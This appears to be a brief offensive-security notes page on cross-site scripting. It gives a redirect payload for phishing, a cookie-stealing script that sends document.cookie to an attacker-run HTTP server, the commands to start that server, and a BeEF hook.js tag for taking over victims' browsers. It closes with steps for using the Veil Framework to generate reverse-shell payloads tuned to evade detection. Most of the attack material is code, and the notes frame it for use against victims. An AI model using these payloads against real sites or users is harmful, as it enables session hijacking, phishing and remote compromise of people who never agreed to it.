# General

If we have a form we can try to insert code, like this:
{% highlight html %}
<script> ... </script>
{% endhighlight %}
If the page execute what are in the form we can make several damage to the page.

There are some examples:
{% highlight html %}
<script> window.location="" </script>
{% endhighlight %}
This will send the target to a different page (phishing).

Also, if we use **deface** we can send a visitor to another part of the webpage. This can break the whole page.

# Blind XSS
We can use XSS to a cookie hijacking. First we need to start an http server, we can do it with python...:
{% highlight bash %}
> python -m http.server 80
{% endhighlight %}
or php...:
{% highlight bash %}
> php -S 0.0.0.0:80
{% endhighlight %}

Then we send others cookie to our http server:
{% highlight html %}
<script>document.write('<img src="http://192.168.0.2:80/xss.png?cookie="+ document.cookie + "')</script>
{% endhighlight %}

# Tools

## BeEF
We can use **BeEF** to capture traffic with XSS.
In a XSS we send:
{% highlight html %}
<script src="http://192.168.1.1:3000/hook.js"></script>
{% endhighlight %}

##### for both, reflected and stored

Then in the **BeEF** panel (http://localhost:3000/hook.js) we can registred the IP who open the page.

We can use the **commands** tab to send scripts to a victim.

## Veil Framework
First we need to install [Veil](https://github.com/Veil-Framework/Veil/).
After the installation we need to start Veil.

We can list everything with the command **list**, use the **Evasion** option. Then **list** again to get all the reverse shell payload.
It is recommendable to change the variables to be more *sneaky*.
##### similar use as metasploit
